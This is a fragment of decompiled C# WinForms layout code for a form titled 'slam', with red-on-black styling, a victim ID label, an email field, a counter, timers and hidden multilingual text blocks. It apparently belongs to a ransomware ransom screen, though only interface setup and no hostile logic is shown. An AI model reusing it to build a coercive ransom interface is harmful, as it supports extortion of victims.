		((Control)label12).set_Font(new Font("Microsoft Tai Le", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label12).set_ForeColor(Color.Red);
		((Control)label12).set_Location(new Point(318, 539));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(53, 23));
		((Control)label12).set_TabIndex(20);
		((Control)label12).set_Text("tu ID:");
		timer8.set_Enabled(true);
		timer8.set_Interval(1000);
		timer8.add_Tick((EventHandler)timer8_Tick);
		timer11.set_Interval(30000);
		timer11.add_Tick((EventHandler)timer11_Tick);
		timer12.set_Enabled(true);
		timer12.set_Interval(1000);
		timer12.add_Tick((EventHandler)timer12_Tick);
		((Control)label_0).set_AutoSize(true);
		((Control)label_0).set_Location(new Point(-592, -7));
		((Control)label_0).set_Name("español");
		((Control)label_0).set_Size(new Size(664, 280));
		((Control)label_0).set_TabIndex(21);
		((Control)label_0).set_Text(componentResourceManager.GetString("español.Text"));
		((Control)label_0).set_Visible(false);
		((Control)ingles).set_AutoSize(true);
		((Control)ingles).set_Location(new Point(-516, 26));
		((Control)ingles).set_Name("ingles");
		((Control)ingles).set_Size(new Size(612, 280));
		((Control)ingles).set_TabIndex(22);
		((Control)ingles).set_Text(componentResourceManager.GetString("ingles.Text"));
		((Control)ingles).set_Visible(false);
		((Control)chino).set_AutoSize(true);
		((Control)chino).set_Location(new Point(-272, -7));
		((Control)chino).set_Name("chino");
		((Control)chino).set_Size(new Size(431, 280));
		((Control)chino).set_TabIndex(23);
		((Control)chino).set_Text(componentResourceManager.GetString("chino.Text"));
		((Control)chino).set_Visible(false);
		((Control)ruso).set_AutoSize(true);
		((Control)ruso).set_Location(new Point(-701, 35));
		((Control)ruso).set_Name("ruso");
		((Control)ruso).set_Size(new Size(828, 280));
		((Control)ruso).set_TabIndex(24);
		((Control)ruso).set_Text(componentResourceManager.GetString("ruso.Text"));
		((Control)ruso).set_Visible(false);
		timer13.set_Interval(2500);
		timer13.add_Tick((EventHandler)timer13_Tick);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Microsoft Tai Le", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.Red);
		((Control)label8).set_Location(new Point(631, 620));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(0, 25));
		((Control)label8).set_TabIndex(25);
		timer18.set_Enabled(true);
		timer18.set_Interval(1000);
		timer18.add_Tick((EventHandler)timer18_Tick);
		((ButtonBase)button3).set_FlatStyle((FlatStyle)0);
		((Control)button3).set_Font(new Font("Microsoft Sans Serif", 11f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button3).set_ForeColor(Color.Red);
		((Control)button3).set_Location(new Point(1117, 267));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(60, 71));
		((Control)button3).set_TabIndex(26);
		((Control)button3).set_Text(">>");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)richTextBox1).set_BackColor(Color.Black);
		((TextBoxBase)richTextBox1).set_BorderStyle((BorderStyle)0);
		((Control)richTextBox1).set_ForeColor(Color.Red);
		((Control)richTextBox1).set_Location(new Point(1040, 3));
		((Control)richTextBox1).set_Name("richTextBox1");
		((TextBoxBase)richTextBox1).set_ReadOnly(true);
		((Control)richTextBox1).set_Size(new Size(149, 144));
		((Control)richTextBox1).set_TabIndex(27);
		((Control)richTextBox1).set_Text("");
		((Control)richTextBox1).set_Visible(false);
		((ButtonBase)button4).set_FlatStyle((FlatStyle)0);
		((Control)button4).set_Font(new Font("Microsoft Sans Serif", 11f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button4).set_ForeColor(Color.Red);
		((Control)button4).set_Location(new Point(12, 259));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(60, 71));
		((Control)button4).set_TabIndex(28);
		((Control)button4).set_Text("<<");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).set_Visible(false);
		((Control)button4).add_Click((EventHandler)button4_Click);
		timer3.add_Tick((EventHandler)timer3_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 20f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(1188, 674));
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)ruso);
		((Control)this).get_Controls().Add((Control)(object)chino);
		((Control)this).get_Controls().Add((Control)(object)ingles);
		((Control)this).get_Controls().Add((Control)(object)label_0);
		((Control)this).get_Controls().Add((Control)(object)label12);
		((Control)this).get_Controls().Add((Control)(object)label11);
		((Control)this).get_Controls().Add((Control)(object)label10);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label9);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)txtEmailAddress);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)lblCount);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_Margin(new Padding(4, 5, 4, 5));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("slam");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
